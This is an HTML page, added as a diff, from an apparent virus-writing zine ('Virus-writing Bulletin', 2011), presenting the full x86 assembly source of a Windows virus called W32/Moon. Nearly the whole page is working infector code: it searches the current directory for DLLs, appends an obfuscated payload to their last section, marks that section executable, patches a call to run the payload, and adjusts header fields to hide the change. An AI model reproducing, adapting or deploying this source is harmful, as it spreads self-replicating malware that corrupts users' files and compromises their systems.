@@ -1,0 +1,461 @@
+<html>
+<head><title>;)</title><link rel="stylesheet" href="style.css" /></head>
+<body>
+<center><h3>Virus-writing Bulletin</h3><h5>Presents!</h5><h4>W32/Moon</h4>-<br><font size=0>. &#9679; glósóli &#9679; .</font></center><br>
+<div id="menu">
+[ <li><a href="1.html">Articles</a></li> ]
+[ <li><a href="2.html">Sources</a></li> ]
+[ <li><a href="3.html">Editorial</a></li> ]
+</div>
+<div id="wrapper">
+<div style="float:left;margin-top:50px;margin-left:1px;">
+<pre>
+.386
+.model  flat, stdcall
+
+IMAGE_DIRECTORY_ENTRY_EXPORT = 78h
+
+.data?
+STACK_REG struct
+LO32_EDI       dd   ?
+LO32_ESI       dd   ?
+LO32_EBP       dd   ?
+LO32_ESP       dd   ?
+LO32_EBX       dd   ?
+LO32_EDX       dd   ?
+LO32_ECX       dd   ?
+LO32_EAX       dd   ?
+STACK_REG ends
+
+_label  macro x
+x label near
+endm
+
+assume  fs:nothing
+
+.code
+vid1_exe        proc
+        pushad
+        xor     ebx, ebx
+        call    vid_1
+        pop     eax
+        pop     eax
+        pop     esp
+        xor     eax, eax
+        pop     dword ptr fs:[eax]
+        pop     eax
+        popad
+        ret     0ch
+
+echo    hh86
+
+_label  vid_1
+        push    dword ptr fs:[ebx]
+        mov     dword ptr fs:[ebx], esp 
+        enter   sizeof WIN32_FIND_DATA + 2, 0
+        mov     edi, esp
+        push    edi
+        db      0e8h
+        dd      6
+        db      2ah
+        db      2eh
+        db      64h
+        db      6ch
+        db      6ch, 0  
+        call    FindFirstFile                ;find DLL files in current directory 
+        xchg    ebp, eax
+        db      0e8h
+        dd      0bh 
+        db      "lua5.1.dll"
+        db      0
+
+;-------------------------------------------------------------------------------
+;load LUA 5.1 DLL if available:
+;then we want luaL_openlib address: currently there is only one version of the DLL
+;5.1. we can use ordinal 1a to retrive API address, but it may fail if different
+;DLL for 5.1 is used 
+;-------------------------------------------------------------------------------
+
+        call    LoadLibrary                  ;do not free!
+        xchg    ecx, eax
+        jecxz   unload
+        db      0e8h
+        dd      0dh
+        db      "luaL_openlib"
+        db      0
+        push    ecx
+        call    GetProcAddress
+        xchg    ebx, eax
+
+_label  load_l
+        pushad
+        xor     eax, eax
+        call    load_dll
+        pop     eax
+        pop     eax
+        pop     esp
+        xor     eax, eax
+        pop     dword ptr fs:[eax]
+        pop     eax
+        popad
+        push    dword ptr [ebx]
+        call    FreeLibrary
+        push    edi
+        push    ebp
+        call    FindNextFile 
+        test    eax, eax
+        jnz     load_l
+
+_label  unload
+        int     3
+
+load_dll        proc
+        push    dword ptr fs:[eax]
+        mov     dword ptr fs:[eax], esp
+        lea     ecx, dword ptr [edi + WIN32_FIND_DATA.cFileName]
+        push    ecx
+        call    LoadLibrary 
+        xchg    ebp, eax
+        push    1                            ;first export might be luaopen_MDLNAME
+        push    ebp
+        call    GetProcAddress
+        xchg    esi, eax
+        mov     edx, ebp
+        add     edx, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
+        movzx   ecx, word ptr [edx + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
+        lea     ecx, dword ptr [edx + ecx + (IMAGE_NT_HEADERS.OptionalHeader - (sizeof IMAGE_SECTION_HEADER - IMAGE_SECTION_HEADER.SizeOfRawData))]
+        movzx   eax, word ptr [edx + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
+        imul    eax, eax, sizeof IMAGE_SECTION_HEADER
+        add     ecx, eax
+        mov     eax, dword ptr [ecx]
+        add     eax, dword ptr [ecx + (IMAGE_SECTION_HEADER.PointerToRawData - IMAGE_SECTION_HEADER.SizeOfRawData)]
+                                             ;no appended data (infection marker (extra size), attribute certificates, debug info, etc)
+        cmp     dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow], eax
+        jne     load_exit
+        push    7fh
+        pop     ecx
+        call    find_e8                      ;find call
+        push    ebp                          ;close library now to save memory
+        call    FreeLibrary
+        xor     ebx, ebx
+        push    ebx
+        push    ebx
+        push    3                            ;OPEN_EXISTING
+        push    ebx
+        push    3                            ;FILE_SHARE_READ + FILE_SHARE_WRITE
+        push    3                            ;GENERIC_READ + GENERIC_WRITE
+        lea     ecx, dword ptr [edi + WIN32_FIND_DATA.cFileName]
+        push    ecx
+        call    CreateFile
+        push    eax
+        push    eax
+        push    ebx
+        push    ebx
+        mov     ebp, dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow]
+        push    ebp
+        push    eax
+        push    ebx
+        add     ebp, 1001h
+        push    ebp
+        push    ebx
+        push    4                            ;PAGE_READWRITE
+        push    ebx
+        push    eax
+        call    CreateFileMapping
+        push    eax
+        push    ebp
+        push    ebx
+        push    ebx
+        push    2                            ;FILE_MAP_WRITE
+        push    eax
+        call    MapViewOfFile
+        push    eax
+        call    findphys
+        pop     eax
+        pop     eax
+        pop     esp
+        xor     eax, eax
+        pop     dword ptr fs:[eax]
+        pop     eax
+        call    UnmapViewOfFile
+        call    CloseHandle
+        call    SetFilePointer 
+        call    SetEndOfFile 
+        call    CloseHandle 
+
+_label  load_exit
+        int     3
+
+_label  fpope8
+        pop     eax
+          
+find_e8         proc
+        lodsb
+        cmp     al, 0e8h
+        je      found_e8
+        loop    find_e8
+        int     3
+
+_label  found_e8
+        mov     eax, dword ptr [esi]
+        lea     eax, dword ptr [esi + eax + 4]
+        call    eip
+        cmp     word ptr [eax], 25ffh
+        jne     find_e8
+        mov     eax, dword ptr [eax + 2]
+        call    eip
+        cmp     dword ptr [eax], ebx
+        jne     find_e8
+        mov     eax, dword ptr [esi - 0bh]
+        call    eip
+        sub     eax, ebp
+        xchg    esi, eax
+        ret
+
+eip             proc
+        cmp     eax, ebp
+        jna     fpope8
+        push    eax
+        sub     eax, ebp
+        cmp     dword ptr [edx + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], eax
+        pop     eax
+        jb      fpope8
+        ret
+eip             endp
+find_e8         endp
+
+require         proc
+        db      68h
+        dd      "v!"
+        db      60h
+        db      6ah
+        db      30h                             ;process environment block
+        pop     esi
+        db      33h
+        db      0d2h
+        db      0e8h                            ;skip SE handler
+        dd      0bh
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        db      61h
+        ret       
+        pop     eax
+        push    eax
+        push    dword ptr fs:[edx]
+        mov     dword ptr fs:[edx], esp         ;SEH protected
+        inc     eax
+
+find_mz:
+        dec     eax
+        xor     ax, ax
+        cmp     word ptr [eax], "ZM"
+        jne     find_mz                         ;cannot get base address from PEB in infected DLL
+        db      1                               ;convert to relative virtual address
+        db      44h
+        db      34h
+        db      -((STACK_REG.LO32_EAX - STACK_REG.LO32_ESP) - (sizeof IMAGE_NT_HEADERS.OptionalHeader.ImageBase shl 1))
+        db      64h
+        db      0adh
+        db      8bh
+        db      40h
+        db      0ch
+        db      8bh
+        db      70h
+        db      14h
+        db      0adh
+        db      8bh
+        db      0
+        db      8bh
+        db      68h
+        db      10h
+        call    skip_crc 
+        dd      03fc1bd8dh
+        dd      0da68238fh
+
+;-------------------------------------------------------------------------------
+;DLL name
+;-------------------------------------------------------------------------------
+
+        db      30h, 0
+
+skip_crc:
+        db      5eh
+ 
+;-------------------------------------------------------------------------------
+;walk lists
+;-------------------------------------------------------------------------------
+
+crc32   macro
+        db      32h
+        db      7
+        db      6ah
+        db      8
+        db      59h
+        db      0d1h
+        db      0e8h
+        db      73h
+        db      5
+        db      35h
+        dd      0edb88320h
+        db      0e2h
+        db      0f5h
+        db      47h
+        db      38h
+        db      0fh
+        db      75h
+        db      0ebh
+endm
+
+import_next:
+        db      8bh
+        db      45h
+        db      IMAGE_DOS_HEADER.e_lfanew
+        db      8bh
+        db      5ch
+        db      28h
+        db      IMAGE_DIRECTORY_ENTRY_EXPORT
+        db      3
+        db      0ddh
+
+export_next:
+        db      8bh
+        db      7bh
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfNames
+        db      3
+        db      0fdh
+        db      8bh
+        db      3ch
+        db      97h
+        db      0f9h
+        db      1bh
+        db      0c0h
+        db      3
+        db      0fdh
+        crc32
+        db      0f7h
+        db      0d0h
+        db      39h
+        db      6
+        je      l_res
+        db      42h
+        db      39h
+        db      53h
+        db      IMAGE_EXPORT_DIRECTORY.TimeDateStamp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_EXPORT_DIRECTORY.TimeDateStamp shl 2 - sizeof IMAGE_EXPORT_DIRECTORY.NumberOfNames
+        jne     export_next
+        int     3
+
+;-------------------------------------------------------------------------------
+;resolve API address
+;-------------------------------------------------------------------------------
+
+l_res:
+        db      8bh
+        db      7bh
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
+        db      3
+        db      0fdh
+        db      0fh
+        db      0b7h
+        db      3ch
+        db      57h
+        db      8bh
+        db      43h
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
+        db      3
+        db      0c5h
+        db      8bh
+        db      4
+        db      0b8h
+        db      3
+        db      0c5h
+        db      50h
+        db      0adh
+        db      33h
+        db      0d2h
+        db      80h
+        db      3eh
+        db      30h
+        jne     import_next
+        db      8bh
+        db      0dch
+        db      56h
+        db      0ffh, 53h, 4                 ;call LoadLibraryA
+        db      50h
+        db      0ffh, 13h                    ;call FreeLibrary
+        int     3
+require         endp
+
+findphys        proc
+        push    dword ptr fs:[ebx]
+        mov     dword ptr fs:[ebx], esp
+        mov     ebp, eax
+        add     ebp, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
+        movzx   ecx, word ptr [ebp + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
+        push    ecx
+        movzx   ebx, word ptr [ebp + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
+        lea     edx, dword ptr [ebp + ebx + IMAGE_NT_HEADERS.OptionalHeader + IMAGE_SECTION_HEADER.VirtualAddress]
+        mov     ebx, edx
+
+_label  find_s
+        push    esi
+        sub     esi, dword ptr [edx]
+        cmp     dword ptr [edx - sizeof IMAGE_SECTION_HEADER.Misc.VirtualSize], esi
+        pop     esi
+        jnb     found_s
+        add     edx, sizeof IMAGE_SECTION_HEADER
+        loop    find_s
+        int     3
+
+_label  found_s
+        sub     esi, dword ptr [edx]
+        add     esi, dword ptr [edx + (IMAGE_SECTION_HEADER.PointerToRawData - IMAGE_SECTION_HEADER.VirtualAddress)]
+        lea     esi, dword ptr [esi + eax + sizeof IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
+        pop     ecx
+        imul    ecx, ecx, sizeof IMAGE_SECTION_HEADER
+        lea     ebx, dword ptr [ebx + ecx - (sizeof IMAGE_SECTION_HEADER + IMAGE_SECTION_HEADER.VirtualAddress)]
+        mov     edi, dword ptr [ebx + IMAGE_SECTION_HEADER.PointerToRawData]
+        add     edi, dword ptr [ebx + IMAGE_SECTION_HEADER.SizeOfRawData]
+        add     edi, eax
+        push    edi
+        push    esi
+        mov     esi, offset require
+        db      6ah, not (low (offset findphys - offset require))
+        pop     ecx
+        not     cl
+        rep     movsb
+        or      dword ptr [ebx + IMAGE_SECTION_HEADER.Characteristics], IMAGE_SCN_MEM_EXECUTE
+        mov     ecx, dword ptr [ebx + IMAGE_SECTION_HEADER.VirtualAddress]
+        add     ecx, dword ptr [ebx + IMAGE_SECTION_HEADER.SizeOfRawData]
+        add     ecx, dword ptr [ebp + IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
+        pop     esi
+        xchg    dword ptr [esi], ecx
+        sub     ecx, dword ptr [ebp + IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
+        pop     edi
+        mov     dword ptr [edi + 1], ecx
+        xor     ecx, ecx
+        mov     ch, 10h
+        stc
+        adc     dword ptr [esp + sizeof STACK_REG.LO32_ESP + 14h], ecx
+        add     dword ptr [ebx + IMAGE_SECTION_HEADER.SizeOfRawData], ecx
+        add     dword ptr [ebx + IMAGE_SECTION_HEADER.Misc.VirtualSize], ecx
+        add     dword ptr [ebp + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], ecx
+        and     byte ptr [ebp + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics + 1], 0f0h
+        xor     ecx, ecx
+        mov     dword ptr [ebp + 0c8h], ecx
+        int 3
+findphys        endp
+load_dll        endp
+vid1_exe        endp
+end     vid1_exe
+</pre>
+</div>
+</div>
+<div id="endofpage"><div style="width:900px;margin:0pt auto;padding-top:5px;padding-bottom:5px">Virus-writing Bulletin 2011</div>
+</body>
+</html>
